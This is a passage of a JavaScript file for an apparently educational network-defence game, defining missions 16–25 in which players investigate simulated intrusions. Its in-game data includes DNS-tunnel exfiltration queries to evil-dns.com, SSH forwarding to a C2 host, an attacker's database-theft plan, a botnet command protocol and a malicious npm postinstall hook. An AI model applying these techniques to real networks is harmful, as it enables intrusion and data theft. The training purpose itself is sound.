// Chapter 2: Network Intelligence (Missions 16-25)

const netMission = (id, num, name, level, time, cmds, briefing, objective, intro, completion, fs, path, hints, pKeys, successCond, triggers, extra = {}) => ({
  id, name, level, estimatedTime: time,
  unlockedCommands: cmds,
  briefing: `[SECURE MESSAGE FROM HANDLER]\n\n${briefing}\n\n— Handler ${level % 2 === 0 ? 'Alpha' : 'Bravo'}`,
  objective, story: { intro, completion }, filesystem: fs, initialPath: path, hints, progressKeys: pKeys,
  successCondition: successCond, triggers, ...extra
});

export const mission16 = netMission('mission16', 16, 'Port Scanner', 16, 7,
  ['ls', 'cd', 'cat', 'grep', 'analyze', 'help', 'clear', 'pwd', 'hint', 'status'],
  "We've intercepted a network scan report from a threat actor. Analyze it to determine which services are vulnerable and which host they're targeting.",
  'Analyze the port scan results to identify the vulnerable target host',
  "Intercepted port scan data. Find the vulnerable target.", "Host 10.0.0.42 is running outdated SSH (v5.3) and an exposed database on port 3306 with no auth. That's their target.",
  { 'scan_data': {
    'scan_results.txt': 'NMAP SCAN RESULTS — 10.0.0.0/24\n============================\nHost: 10.0.0.1 (gateway)\n  22/tcp  open  ssh       OpenSSH 8.9 (secure)\n  443/tcp open  https     nginx 1.24 (secure)\n\nHost: 10.0.0.10 (web-srv)\n  80/tcp  open  http      Apache 2.4.58 (current)\n  443/tcp open  https     Apache 2.4.58 (current)\n  3000/tcp open node      Express.js (firewalled)\n\nHost: 10.0.0.25 (mail-srv)\n  25/tcp  open  smtp      Postfix (patched)\n  993/tcp open  imaps     Dovecot 2.3 (secure)\n\nHost: 10.0.0.42 (db-legacy)\n  22/tcp  open  ssh       OpenSSH 5.3 ⚠️ OUTDATED\n  3306/tcp open mysql     MySQL 5.5 ⚠️ NO AUTH\n  8080/tcp open http      Tomcat 6.0 ⚠️ EOL\n  5900/tcp open vnc       VNC ⚠️ NO PASSWORD\n\nHost: 10.0.0.50 (backup-srv)\n  22/tcp  open  ssh       OpenSSH 8.9 (secure)\n  873/tcp open  rsync     (authenticated)',
    'vulnerability_db.txt': 'VULNERABILITY CROSS-REFERENCE:\n\nOpenSSH 5.3:\n  CVE-2016-0778 — Buffer overflow (CRITICAL)\n  CVE-2015-5600 — Brute force amplification (HIGH)\n\nMySQL 5.5 No Auth:\n  DIRECT ACCESS — No CVE needed, misconfiguration\n  Full database read/write without credentials\n\nTomcat 6.0:\n  CVE-2017-12615 — Remote code execution (CRITICAL)\n  CVE-2016-8735 — Deserialization attack (HIGH)\n\nVNC No Password:\n  Full remote desktop access without authentication',
    'attacker_notes.txt': '=== INTERCEPTED ATTACKER NOTES ===\nTarget: 10.0.0.42 (db-legacy)\nApproach:\n  1. Connect to MySQL (no auth needed)\n  2. Dump customer database\n  3. Use SSH vuln for persistent access\n  4. VNC for real-time monitoring\n  5. Exfil through Tomcat reverse shell\n\nEstimated data: 2M customer records\nValue: ~$500K on dark web'
  }},
  '/scan_data',
  ["Check the scan results for hosts with outdated or vulnerable services.", "Look for services marked with ⚠️ warnings — especially 'NO AUTH' and 'OUTDATED'.", "Host 10.0.0.42 has the most vulnerabilities. Check the attacker_notes.txt for confirmation."],
  ['foundVulnHost', 'confirmedTarget'],
  (p) => p.foundVulnHost && p.confirmedTarget,
  [
    { command: 'analyze', args: ['scan_results.txt'], progressUpdate: { foundVulnHost: true }, narrative: '⚠️ Host 10.0.0.42 (db-legacy) has 4 critical vulnerabilities: outdated SSH, unauthenticated MySQL, EOL Tomcat, and open VNC!' },
    { command: 'cat', args: ['attacker_notes.txt'], progressUpdate: { confirmedTarget: true }, narrative: '🎯 Confirmed: The attacker plans to start with MySQL (no auth) and pivot through all vulnerable services on 10.0.0.42.' }
  ]
);

export const mission17 = netMission('mission17', 17, 'DNS Poisoning', 17, 8,
  ['ls', 'cd', 'cat', 'grep', 'analyze', 'help', 'clear', 'pwd', 'hint', 'status'],
  "Our DNS servers are returning wrong IP addresses for critical internal services. Someone has poisoned our DNS cache. Analyze the DNS records to find which entries are fake and trace the attacker.",
  'Find the poisoned DNS entries and trace back to the attacker',
  "DNS cache is poisoned. Find the fake entries.", "4 DNS entries were poisoned, redirecting banking and email traffic to 203.0.113.66 — an attacker-controlled server.",
  { 'dns_investigation': {
    'current_dns.txt': 'CURRENT DNS CACHE:\nmail.company.com       -> 203.0.113.66     ⟵ CHANGED\nwebmail.company.com    -> 203.0.113.66     ⟵ CHANGED\nvpn.company.com        -> 10.0.0.5         (correct)\nintranet.company.com   -> 10.0.0.10        (correct)\nbank.trusted-partner.com -> 203.0.113.66   ⟵ CHANGED\npayroll.company.com    -> 203.0.113.66     ⟵ CHANGED\nslack.com              -> 34.202.40.46     (correct)\ngithub.com             -> 140.82.114.4     (correct)',
    'correct_dns.txt': 'VERIFIED DNS RECORDS (from backup):\nmail.company.com       -> 10.0.0.20\nwebmail.company.com    -> 10.0.0.20\nvpn.company.com        -> 10.0.0.5\nintranet.company.com   -> 10.0.0.10\nbank.trusted-partner.com -> 185.120.22.10\npayroll.company.com    -> 10.0.0.30\nslack.com              -> 34.202.40.46\ngithub.com             -> 140.82.114.4',
    'dns_query_log.txt': 'DNS QUERY LOG (last 24 hours):\n2024-04-14 01:00 — Normal queries (500/hour)\n2024-04-14 02:00 — Normal queries (120/hour)\n2024-04-14 03:15 — BURST: 50,000 queries in 2 minutes ⚠️\n  Source: 192.168.1.99 (unknown device)\n  Type: A records for mail, webmail, bank, payroll\n  Response: All poisoned to 203.0.113.66\n2024-04-14 03:17 — DNS cache reloaded\n2024-04-14 03:20 — Poisoned entries active\n2024-04-14 08:00 — Users reporting SSL warnings (expected — fake certs)',
    'attacker_ip.txt': 'IP INVESTIGATION: 203.0.113.66\nLocation: Eastern Europe\nHosting: BulletproofHost Inc.\nAssociated Domains:\n  - fake-mail.evil.net\n  - phish-bank.evil.net\n  - credential-harvest.evil.net\nSSL Certificate: Self-signed (NOT trusted)\nPurpose: Credential harvesting proxy\n\nIP INVESTIGATION: 192.168.1.99\nType: Internal device\nMAC: AA:BB:CC:DD:EE:FF\nLocation: Server Room B, Rack 4\nDevice: Raspberry Pi (unauthorized)'
  }},
  '/dns_investigation',
  ["Compare the current DNS entries with the verified backup.", "Look for entries where the IP has changed to the same suspicious IP address.", "Check the DNS query log for the burst attack and the attacker_ip.txt for full details."],
  ['foundPoisonedEntries', 'tracedAttacker'],
  (p) => p.foundPoisonedEntries && p.tracedAttacker,
  [
    { command: 'cat', args: ['current_dns.txt'], progressUpdate: { foundPoisonedEntries: true }, narrative: '☠️ Found 4 poisoned DNS entries — all pointing to 203.0.113.66! Mail, webmail, banking, and payroll traffic is being hijacked.' },
    { command: 'cat', args: ['attacker_ip.txt'], progressUpdate: { tracedAttacker: true }, narrative: '🔍 Attack source: unauthorized Raspberry Pi in Server Room B, Rack 4. The destination 203.0.113.66 is a credential harvesting proxy.' }
  ]
);

export const mission18 = netMission('mission18', 18, 'Packet Capture', 18, 8,
  ['ls', 'cd', 'cat', 'grep', 'analyze', 'help', 'clear', 'pwd', 'hint', 'status'],
  "We captured network traffic during a suspected data exfiltration. The attacker is using DNS tunneling to smuggle data out. Find the hidden data in the DNS queries.",
  'Analyze packet capture to find data being exfiltrated via DNS tunneling',
  "Network traffic captured during exfiltration. Find the DNS tunnel.", "The attacker used DNS TXT record queries to smuggle base64-encoded data to evil-dns.com. Customer SSNs were being exfiltrated.",
  { 'pcap_analysis': {
    'summary.txt': 'PACKET CAPTURE SUMMARY:\nDuration: 2 hours (02:00 - 04:00)\nTotal Packets: 45,230\nProtocol Breakdown:\n  HTTP:  15,000 (33%)\n  HTTPS: 20,000 (44%)\n  DNS:   8,230  (18%) ⚠️ ABNORMALLY HIGH\n  Other: 2,000  (5%)\n\nNote: Normal DNS traffic is ~5%. 18% is suspicious.',
    'dns_queries.txt': 'SUSPICIOUS DNS QUERIES (filtered):\n\nTXT record queries to evil-dns.com:\n  Q: dXNlcjpqb2huX2RvZQ==.evil-dns.com\n  Q: c3NuOjEyMy00NS02Nzg5.evil-dns.com\n  Q: Y2NuOjQwMjQtMTIzNC01Njc4LTkwMTI=.evil-dns.com\n  Q: YWRkcmVzczoxMjMgTWFpbiBTdA==.evil-dns.com\n  Q: cGhvbmU6NTU1LTAxMjM=.evil-dns.com\n\n[1,247 similar queries omitted]\n\nNote: Subdomain labels appear to be base64-encoded data.\nDestination: evil-dns.com (known C2 domain)',
    'decoded_samples.txt': 'DECODED DNS QUERY SAMPLES:\n\ndXNlcjpqb2huX2RvZQ== → user:john_doe\nc3NuOjEyMy00NS02Nzg5 → ssn:123-45-6789\nY2NuOjQwMjQtMTIzNC01Njc4LTkwMTI= → ccn:4024-1234-5678-9012\nYWRkcmVzczoxMjMgTWFpbiBTdA== → address:123 Main St\ncGhvbmU6NTU1LTAxMjM= → phone:555-0123\n\n⚠️ ALERT: Customer PII is being exfiltrated!\nEstimated records: ~1,247 customers\nData types: names, SSNs, credit cards, addresses',
    'source_trace.txt': 'EXFILTRATION SOURCE:\nInternal IP: 10.0.0.88\nHostname: acct-workstation-12\nUser logged in: t.bradley\nProcess: dns-helper.exe (NOT legitimate)\nParent process: powershell.exe\n\nDNS tunnel tool detected: dnscat2\nConfiguration:\n  Server: evil-dns.com\n  Encoding: base64\n  Chunk size: 63 bytes per query'
  }},
  '/pcap_analysis',
  ["Start with the summary — DNS traffic at 18% is abnormally high.", "The dns_queries.txt shows base64-encoded data in subdomain labels — classic DNS tunneling.", "Check decoded_samples.txt to see what data is being stolen."],
  ['foundDNSTunnel', 'identifiedData'],
  (p) => p.foundDNSTunnel && p.identifiedData,
  [
    { command: 'cat', args: ['dns_queries.txt'], progressUpdate: { foundDNSTunnel: true }, narrative: '🔍 DNS tunneling detected! Base64-encoded data is being smuggled out as subdomain queries to evil-dns.com.' },
    { command: 'cat', args: ['decoded_samples.txt'], progressUpdate: { identifiedData: true }, narrative: '🚨 CRITICAL: Customer SSNs, credit card numbers, and addresses are being exfiltrated. ~1,247 records compromised!' }
  ]
);

export const mission19 = netMission('mission19', 19, 'MITM Attack', 19, 7,
  ['ls', 'cd', 'cat', 'grep', 'analyze', 'help', 'clear', 'pwd', 'hint', 'status'],
  "Employees are reporting SSL certificate warnings when accessing banking sites. We suspect a Man-in-the-Middle attack. Analyze the network to find the rogue device.",
  'Find the rogue device performing a Man-in-the-Middle attack on the network',
  "SSL warnings everywhere. Someone is intercepting traffic.", "A rogue device at 10.0.0.99 is performing ARP spoofing, presenting fake SSL certificates to intercept banking credentials.",
  { 'mitm_investigation': {
    'ssl_warnings.txt': 'SSL CERTIFICATE WARNINGS REPORTED:\n\nUser: alice@company.com\n  Site: bank.com\n  Warning: Certificate issuer "MITM-Proxy CA" (NOT TRUSTED)\n  Expected issuer: DigiCert Global Root G2\n\nUser: bob@company.com\n  Site: paypal.com\n  Warning: Certificate issuer "MITM-Proxy CA" (NOT TRUSTED)\n\nUser: carol@company.com\n  Site: chase.com\n  Warning: Certificate issuer "MITM-Proxy CA" (NOT TRUSTED)\n\n12 more users reported similar warnings.',
    'arp_table.txt': 'ARP TABLE (Network 10.0.0.0/24):\nIP Address     MAC Address        Type\n10.0.0.1       AA:11:22:33:44:55  Gateway (correct)\n10.0.0.10      BB:22:33:44:55:66  Web server (correct)\n10.0.0.1       CC:99:88:77:66:55  ⚠️ DUPLICATE IP!\n10.0.0.99      CC:99:88:77:66:55  Unknown device\n\nALERT: ARP SPOOFING DETECTED!\nMAC CC:99:88:77:66:55 is claiming to be the gateway (10.0.0.1)\nAll traffic to the internet is being routed through 10.0.0.99',
    'rogue_device.txt': 'ROGUE DEVICE INVESTIGATION:\nIP: 10.0.0.99\nMAC: CC:99:88:77:66:55\nDevice Type: Linux laptop\nHostname: kali-attack\nRunning Services:\n  - arpspoof (ARP poisoning)\n  - sslstrip (SSL downgrade)\n  - mitmproxy (HTTPS interception)\n  - Fake CA: "MITM-Proxy CA"\n\nPhysical Location: Conference Room B, connected to wall port ETH-7\nNo authorized device assigned to this port.',
    'intercepted_creds.txt': 'CREDENTIALS INTERCEPTED BY ROGUE DEVICE:\n(recovered from device\'s log files)\n\nalice@company.com -> bank.com\n  Username: alice.smith\n  Password: [REDACTED]\n\nbob@company.com -> paypal.com  \n  Username: bob.franklin\n  Password: [REDACTED]\n\n8 more credential pairs captured.\n\nTotal: 10 employees compromised.\nAll passwords must be rotated immediately.'
  }},
  '/mitm_investigation',
  ["Check the SSL warnings — what certificate authority are they seeing?", "The ARP table shows a duplicate IP for the gateway — that's ARP spoofing.", "Find the rogue device details in rogue_device.txt."],
  ['foundARPSpoof', 'identifiedDevice'],
  (p) => p.foundARPSpoof && p.identifiedDevice,
  [
    { command: 'cat', args: ['arp_table.txt'], progressUpdate: { foundARPSpoof: true }, narrative: '🔀 ARP spoofing detected! Device at 10.0.0.99 is impersonating the gateway, routing all internet traffic through itself.' },
    { command: 'cat', args: ['rogue_device.txt'], progressUpdate: { identifiedDevice: true }, narrative: '💻 Rogue device: Kali Linux laptop in Conference Room B, running arpspoof + mitmproxy. 10 employees\' credentials captured!' }
  ]
);

export const mission20 = netMission('mission20', 20, 'Firewall Bypass', 20, 8,
  ['ls', 'cd', 'cat', 'grep', 'analyze', 'help', 'clear', 'pwd', 'hint', 'status'],
  "Our firewall logs show someone is successfully bypassing our security rules. They're accessing blocked external services. Find how they're doing it.",
  'Determine how the attacker is bypassing the firewall rules',
  "Someone is bypassing the firewall. Find their method.", "The attacker is using SSH tunneling through an authorized server to create a SOCKS proxy, bypassing all firewall rules.",
  { 'firewall_analysis': {
    'firewall_rules.txt': 'FIREWALL RULES (Active):\n1. DENY ALL outbound to known malware C2 IPs\n2. DENY ALL outbound to Tor exit nodes\n3. DENY ALL outbound SSH except to 10.0.0.5 (jump box)\n4. ALLOW outbound HTTP/HTTPS (port 80, 443)\n5. ALLOW outbound DNS (port 53)\n6. DENY ALL outbound on other ports\n7. DENY inbound from external except VPN\n\nNote: Rules appear correctly configured.',
    'blocked_attempts.txt': 'BLOCKED CONNECTION ATTEMPTS (last 24h):\n403 attempts to known C2 addresses — BLOCKED ✅\n28 attempts to Tor exit nodes — BLOCKED ✅\n15 attempts on non-standard ports — BLOCKED ✅\n\nHowever: User t.chen is accessing darknet markets\ndespite all blocks being active. HOW?',
    'connection_log.txt': 'AUTHORIZED SSH CONNECTIONS:\nUser: t.chen -> 10.0.0.5 (jump box) — PERSISTENT CONNECTION\n  Started: 2024-04-13 09:00\n  Duration: 15 hours (still active)\n  Data transferred: 4.2 GB ⚠️ ABNORMAL\n  Normal SSH session: <100MB/day\n\nNote: t.chen has legitimate SSH access to jump box.\nBut 4.2GB of data through SSH is suspicious.',
    'jump_box_audit.txt': 'JUMP BOX (10.0.0.5) AUDIT:\n\nUser: t.chen\nActive SSH sessions: 1 (from 10.0.0.88)\nSSH tunnel detected:\n  -D 1080 (SOCKS proxy)\n  -L 8080:darkmarket.onion:80\n  -L 9090:c2-server.evil:4444\n\nTHIS IS THE BYPASS METHOD:\nt.chen is creating SSH tunnels through the jump box\nto route traffic to blocked destinations.\nThe firewall only sees traffic to 10.0.0.5 (allowed).\n\nRecommendation: Implement SSH tunnel detection\nand restrict dynamic port forwarding.',
    'browser_proxy.txt': 'T.CHEN BROWSER CONFIG:\nProxy Setting: SOCKS5 localhost:1080\n\nWith this config, ALL browser traffic routes through:\n  Browser → localhost:1080 → SSH tunnel → 10.0.0.5 → Internet\n\nFirewall sees: t.chen → 10.0.0.5 (authorized SSH)\nActual traffic: t.chen → darknet markets, C2 servers, etc.'
  }},
  '/firewall_analysis',
  ["The firewall rules look correct. But someone is still getting through — how?", "Check the SSH connection log. One connection is transferring suspiciously large amounts of data.", "The jump box audit reveals SSH tunnels being used as a SOCKS proxy to bypass the firewall."],
  ['foundSuspiciousSSH', 'discoveredBypass'],
  (p) => p.foundSuspiciousSSH && p.discoveredBypass,
  [
    { command: 'cat', args: ['connection_log.txt'], progressUpdate: { foundSuspiciousSSH: true }, narrative: '📡 SSH connection from t.chen to jump box has transferred 4.2GB — way beyond normal. Something is tunneled through it.' },
    { command: 'cat', args: ['jump_box_audit.txt'], progressUpdate: { discoveredBypass: true }, narrative: '🔓 Found it! SSH dynamic port forwarding (-D 1080) creates a SOCKS proxy through the jump box, bypassing ALL firewall rules!' }
  ]
);

export const mission21 = netMission('mission21', 21, 'WiFi Intrusion', 21, 7,
  ['ls', 'cd', 'cat', 'grep', 'help', 'clear', 'pwd', 'hint', 'status'],
  "An unauthorized device has been connecting to our corporate WiFi. It's moving laterally across the network. Find which access point it connected to and what it's doing.",
  'Find the unauthorized WiFi device and determine its activities',
  "Unknown device on the WiFi. Track it down.", "An unauthorized IoT device (smart plug with modified firmware) connected to AP-3, scanned the network, and started exfiltrating files to an external server.",
  { 'wifi_incident': {
    'connected_devices.txt': 'CONNECTED DEVICES — CORPORATE WIFI:\nMAC: AA:11:22:33:44:01 | IP: 10.1.1.10 | Device: iPhone (j.smith) ✅\nMAC: BB:22:33:44:55:02 | IP: 10.1.1.11 | Device: MacBook (l.jones) ✅\nMAC: CC:33:44:55:66:03 | IP: 10.1.1.12 | Device: ThinkPad (m.wilson) ✅\nMAC: DD:44:55:66:77:04 | IP: 10.1.1.13 | Device: UNKNOWN ⚠️ NOT REGISTERED\nMAC: EE:55:66:77:88:05 | IP: 10.1.1.14 | Device: Galaxy (k.brown) ✅',
    'unknown_device.txt': 'INVESTIGATION — MAC DD:44:55:66:77:04:\nVendor (OUI lookup): Shenzhen Smart Electronics\nDevice type: Smart Plug (IoT)\nFirmware: Modified/Custom ⚠️\nConnected to: AP-3 (Conference Room A)\nFirst seen: 2024-04-14 14:00\nNetwork scans detected: 47 in first hour\nOpen ports on device: 22 (SSH), 8888 (HTTP admin)',
    'network_scan.txt': 'SCANS PERFORMED BY DEVICE DD:44:55:66:77:04:\n14:05 — ARP scan of 10.1.1.0/24 (host discovery)\n14:10 — Port scan of 10.1.1.1-254\n14:25 — SMB enumeration of file shares\n14:30 — Connected to \\\\10.1.1.50\\shared (file server)\n14:35 — Downloaded: financial_reports.zip (230MB)\n14:40 — Downloaded: employee_data.csv (45MB)\n14:50 — Outbound connection to 198.51.100.200:443\n14:55 — Uploaded 275MB to 198.51.100.200',
    'ap_log.txt': 'ACCESS POINT LOG — AP-3:\n14:00 — New device associated: DD:44:55:66:77:04\n  Auth: WPA2-Enterprise\n  Credential used: guest_account (should be disabled!)\n  Signal strength: -30dBm (very close to AP)\n  Location estimate: Conference Room A'
  }},
  '/wifi_incident',
  ["Look for unauthorized devices in the connected devices list.", "Check the unknown device details — it's an IoT device with modified firmware.", "The network scan log shows exactly what data was stolen."],
  ['foundRogueDevice', 'identifiedActivity'],
  (p) => p.foundRogueDevice && p.identifiedActivity,
  [
    { command: 'cat', args: ['unknown_device.txt'], progressUpdate: { foundRogueDevice: true }, narrative: '📱 Rogue device found: Modified smart plug connected to AP-3 using a guest account that should have been disabled!' },
    { command: 'cat', args: ['network_scan.txt'], progressUpdate: { identifiedActivity: true }, narrative: '📤 The device scanned the network, downloaded 275MB of financial reports and employee data, and exfiltrated to 198.51.100.200!' }
  ]
);

export const mission22 = netMission('mission22', 22, 'VPN Compromise', 22, 8,
  ['ls', 'cd', 'cat', 'grep', 'analyze', 'help', 'clear', 'pwd', 'hint', 'status'],
  "Our VPN server was compromised. The attacker may have intercepted encrypted traffic. Analyze the VPN logs and certificate chain to determine the extent of the breach.",
  'Determine if VPN traffic was intercepted and which users are affected',
  "VPN server compromised. Was traffic intercepted?", "The attacker replaced the VPN server certificate with their own, intercepted 23 users' traffic for 6 hours before detection.",
  { 'vpn_breach': {
    'vpn_logs.txt': 'VPN SERVER LOGS:\n2024-04-15 00:00 — Server restarted by: root (normal maintenance window)\n2024-04-15 00:05 — Certificate loaded: vpn.company.com (Serial: ABC123)\n2024-04-15 02:30 — Server restarted by: unknown session ⚠️\n2024-04-15 02:31 — Certificate loaded: vpn.company.com (Serial: XYZ789) ⚠️ DIFFERENT CERT\n2024-04-15 02:32 — 23 users reconnected to new certificate\n2024-04-15 08:30 — Security alert: Certificate mismatch detected\n2024-04-15 08:35 — Original certificate restored',
    'cert_comparison.txt': 'CERTIFICATE COMPARISON:\n\nOriginal Certificate (Serial: ABC123):\n  Issuer: DigiCert (Trusted CA)\n  Valid: 2024-01-01 to 2025-01-01\n  Key: RSA-4096\n  SHA256: a1b2c3d4...\n\nRogue Certificate (Serial: XYZ789):\n  Issuer: Self-Signed ⚠️\n  Valid: 2024-04-15 to 2025-04-15\n  Key: RSA-2048 (weaker)\n  SHA256: e5f6g7h8...\n\nThe rogue certificate was self-signed and used a weaker key.\nAll traffic from 02:31 to 08:30 was potentially intercepted.',
    'affected_users.txt': 'USERS CONNECTED DURING COMPROMISE WINDOW:\n(02:31 — 08:30, April 15)\n\n23 users total:\n  - 8 accessed email (credentials potentially captured)\n  - 5 accessed financial systems (transactions may be recorded)\n  - 3 accessed HR systems (employee data exposed)\n  - 7 accessed development servers (source code visible)\n\nAll 23 users must rotate passwords immediately.\nFinancial transactions during this period must be audited.',
    'intrusion_vector.txt': 'HOW THE ATTACKER GOT IN:\n1. Exploited CVE-2024-21762 (Fortinet VPN vulnerability)\n2. Gained root access to VPN server\n3. Generated self-signed certificate\n4. Restarted VPN service with rogue certificate\n5. Intercepted all reconnecting users\' traffic\n6. Traffic decrypted using rogue private key\n\nRemediation:\n- Patch CVE-2024-21762\n- Validate certificate pinning\n- Force all users to re-authenticate\n- Audit 6-hour window for data exfiltration'
  }},
  '/vpn_breach',
  ["Check the VPN logs for unusual server restarts.", "The certificate comparison shows the legit cert was replaced with a self-signed one.", "The intrusion vector explains exactly how the attacker compromised the VPN."],
  ['foundCertSwap', 'determinedImpact'],
  (p) => p.foundCertSwap && p.determinedImpact,
  [
    { command: 'cat', args: ['cert_comparison.txt'], progressUpdate: { foundCertSwap: true }, narrative: '🔐 Certificate swap confirmed! The attacker replaced the DigiCert cert with a self-signed one. 6 hours of traffic compromised.' },
    { command: 'cat', args: ['affected_users.txt'], progressUpdate: { determinedImpact: true }, narrative: '👥 23 users affected. Email credentials, financial data, HR records, and source code were all potentially exposed.' }
  ]
);

export const mission23 = netMission('mission23', 23, 'C2 Beacon', 23, 8,
  ['ls', 'cd', 'cat', 'grep', 'analyze', 'help', 'clear', 'pwd', 'hint', 'status'],
  "A workstation is sending periodic HTTP requests to an unknown server every 5 minutes. This looks like a Command & Control beacon. Analyze the traffic patterns and identify the C2 server.",
  'Identify the C2 server and understand the beacon communication pattern',
  "Periodic HTTP beacons detected. Find the C2 server.", "Workstation is infected with a RAT beaconing to darkc2.evil.com every 5 minutes, receiving commands and exfiltrating screenshots.",
  { 'c2_analysis': {
    'traffic_pattern.txt': 'HTTP BEACON ANALYSIS:\nSource: 10.0.0.77 (workstation-sales-04)\nDestination: 45.33.32.77\n\nBeacon Pattern:\n  09:00:00 — GET /check?id=ws04&status=active\n  09:05:00 — GET /check?id=ws04&status=active\n  09:10:00 — GET /check?id=ws04&status=active\n  09:15:00 — POST /data?id=ws04 (128KB upload)\n  09:20:00 — GET /check?id=ws04&status=active\n  09:25:00 — GET /check?id=ws04&status=active\n  09:30:00 — POST /data?id=ws04 (256KB upload)\n\nInterval: Every 5 minutes (jitter: ±10 seconds)\nUpload frequency: Every 15 minutes\nTotal observed beacons: 288 (24 hours)',
    'c2_server_info.txt': 'C2 SERVER: 45.33.32.77\nReverse DNS: darkc2.evil.com\nASN: AS13335\nHosting: BulletproofHosting.ru\nFirst seen: 2024-03-01\nThreat intel: Known Cobalt Strike C2\n\nHTTP Headers from server:\n  Server: Apache/2.4.41\n  X-Beacon-ID: ws04\n  X-Task: screenshot;keylog;filelist\n  X-Interval: 300\n\nNote: X-Task header tells the beacon what to do next.',
    'beacon_data.txt': 'DECODED BEACON DATA:\n\nGET /check responses contain encoded tasks:\n  "screenshot" — Take desktop screenshot\n  "keylog" — Send keylogger buffer\n  "filelist" — List files in Documents/Desktop\n  "download" — Download specific file\n  "sleep" — Increase beacon interval\n\nPOST /data uploads contain:\n  - Desktop screenshots (JPEG, ~128KB each)\n  - Keylogger data (plaintext, ~5KB)\n  - Directory listings (text, ~10KB)\n\nEstimated total data exfiltrated: 450MB over 7 days',
    'process_info.txt': 'MALICIOUS PROCESS ON 10.0.0.77:\nProcess: svchost.exe (PID 4412)\nPath: C:\\Users\\Public\\svchost.exe ⚠️ Wrong location\nParent: explorer.exe (user-initiated)\nStart time: 2024-04-08 11:23\nNetwork connections: 45.33.32.77:80\n\nPersistence: Registry Run key\nFile hash: matches known Cobalt Strike beacon\n\nNote: Legitimate svchost.exe runs from\nC:\\Windows\\System32\\ not C:\\Users\\Public\\'
  }},
  '/c2_analysis',
  ["Check the traffic pattern — regular HTTP requests every 5 minutes is a classic C2 beacon.", "The C2 server info reveals the server identity and what tasks it assigns to the beacon.", "Process info shows the malware runs from the wrong system directory."],
  ['identifiedBeacon', 'foundC2Server'],
  (p) => p.identifiedBeacon && p.foundC2Server,
  [
    { command: 'cat', args: ['traffic_pattern.txt'], progressUpdate: { identifiedBeacon: true }, narrative: '📡 C2 beacon confirmed! HTTP GET every 5 minutes, POST uploads every 15 minutes. Classic command-and-control pattern.' },
    { command: 'cat', args: ['c2_server_info.txt'], progressUpdate: { foundC2Server: true }, narrative: '🎯 C2 server identified: darkc2.evil.com (45.33.32.77). Known Cobalt Strike infrastructure. Running for 7 days, 450MB exfiltrated!' }
  ]
);

export const mission24 = netMission('mission24', 24, 'The Botnet', 24, 9,
  ['ls', 'cd', 'cat', 'grep', 'analyze', 'help', 'clear', 'pwd', 'hint', 'status'],
  "A massive DDoS attack is hitting our servers. We've traced it to a botnet. Analyze the command server data we seized to understand the botnet's scope and stop it.",
  'Analyze seized botnet data to determine its scope and find the kill switch',
  "DDoS from a botnet. Find how to stop it.", "Botnet controls 15,000 devices. The kill switch command 'KILLALL-X7' sent to port 9999 will deactivate all bots.",
  { 'botnet_seized': {
    'bot_inventory.txt': 'BOTNET INVENTORY:\n\nTotal bots registered: 15,247\n\nGeographic Distribution:\n  North America: 4,200 (28%)\n  Europe: 5,100 (33%)\n  Asia: 3,800 (25%)\n  Other: 2,147 (14%)\n\nDevice Types:\n  IP cameras: 6,500 (43%)\n  Home routers: 4,200 (28%)\n  Smart TVs: 2,100 (14%)\n  NAS devices: 1,500 (10%)\n  Other IoT: 947 (5%)\n\nAll compromised via default passwords or unpatched firmware.',
    'attack_config.txt': 'CURRENT ATTACK CONFIGURATION:\n\nTarget: 203.0.113.50 (our web server)\nAttack Type: HTTP Flood + SYN Flood\nPackets per bot: 1000/second\nTotal traffic: ~15 Gbps\n\nStarted: 2024-04-15 06:00 UTC\nDuration: Ongoing\nEstimated cost to us: $50,000/hour in downtime',
    'c2_commands.txt': 'BOTNET C2 COMMAND PROTOCOL:\n\nPORT: 9999 (all bots listen on this port)\n\nAvailable Commands:\n  ATTACK <target> <type> <duration>\n  SCAN <subnet> — Scan for new vulnerable devices\n  UPDATE <url> — Update bot firmware\n  SLEEP <seconds> — Go dormant\n  KILLALL-X7 — ⚠️ KILL SWITCH — Deactivate all bots\n  STATUS — Report bot status\n\nAuthentication: None (commands sent in plaintext)\n\nNote: KILLALL-X7 was left as a safety mechanism\nby the botnet author. It permanently disables\nall bots and removes persistence.',
    'operator_chat.txt': 'INTERCEPTED IRC CHAT (botnet operators):\n\n<darkmaster> bots are ready, 15k strong\n<ghost_x> target confirmed. hit them at 0600 UTC\n<darkmaster> remember, if things go south, KILLALL-X7\n<ghost_x> that kills everything right?\n<darkmaster> yeah, all bots wipe themselves. only use as last resort\n<ghost_x> ok. launching now\n<darkmaster> the kill switch listens on 9999, broadcast to all IPs'
  }},
  '/botnet_seized',
  ["Check the bot inventory to understand the botnet's size.", "The C2 commands file lists all available commands including a potential kill switch.", "Read the operator chat — they mention the kill switch command."],
  ['assessedScope', 'foundKillSwitch'],
  (p) => p.assessedScope && p.foundKillSwitch,
  [
    { command: 'cat', args: ['bot_inventory.txt'], progressUpdate: { assessedScope: true }, narrative: '🤖 Botnet size: 15,247 compromised devices across 4 continents! Mostly IoT devices with default passwords.' },
    { command: 'cat', args: ['c2_commands.txt'], progressUpdate: { foundKillSwitch: true }, narrative: '💀 KILL SWITCH FOUND: Send "KILLALL-X7" to port 9999. This will permanently deactivate all bots and remove persistence!' }
  ]
);

export const mission25 = netMission('mission25', 25, 'Supply Chain Attack', 25, 9,
  ['ls', 'cd', 'cat', 'grep', 'analyze', 'help', 'clear', 'pwd', 'hint', 'status'],
  "A popular open-source library was compromised. Malicious code was injected into a recent update. Analyze the package diffs to find the backdoor and determine what it does.",
  'Find the malicious code injected into the open-source library update',
  "Open-source library backdoored. Find the injected code.", "The attacker added a post-install script that sends environment variables (including secrets) to their server whenever the package is installed.",
  { 'supply_chain': {
    'package_info.txt': 'PACKAGE: super-utils v2.4.1\nRegistry: npm\nWeekly downloads: 2,400,000\nDependencies: 0\nLast safe version: v2.4.0\nCompromised version: v2.4.1\nPublished: 2024-04-14 03:00 UTC\nPublisher: maintainer-bot (hijacked account)',
    'diff_summary.txt': 'DIFF: v2.4.0 → v2.4.1\n\nFiles changed: 3\n  - package.json (modified)\n  - lib/utils.js (unchanged — decoy diff)\n  - scripts/postinstall.js (NEW FILE ⚠️)\n\nTotal lines added: 47\nTotal lines removed: 2',
    'package_json_diff.txt': 'DIFF: package.json\n\n- "version": "2.4.0"\n+ "version": "2.4.1"\n\n+ "scripts": {\n+   "postinstall": "node scripts/postinstall.js"\n+ }\n\nNote: Added a postinstall script that runs automatically\nwhen anyone installs this package via npm install.',
